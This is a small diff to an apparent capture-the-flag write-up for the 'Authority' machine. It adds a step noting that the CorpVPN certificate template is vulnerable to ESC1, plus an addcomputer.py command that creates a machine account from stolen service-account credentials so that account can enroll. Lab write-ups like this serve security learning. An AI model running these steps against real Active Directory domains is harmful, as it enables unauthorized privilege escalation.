@@ -297,4 +297,8 @@ Certificate Templates
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
-14. We discover the CorpVPN template that is vulnerable to ESC1. 
+14. We discover the CorpVPN template that is vulnerable to ESC1. However, only members of Domain Computers group can enroll. Therefore, we will add a computer account using the `addcomputer`.py script
+
+`addcomputer.py -computer-name 'TEST$' -computer-pass 'Password!' -dc-host dc.authority.htb -domain-netbios authority.htb authority.htb/svc_ldap:$(cat svc_ldap.pass) `
+
+
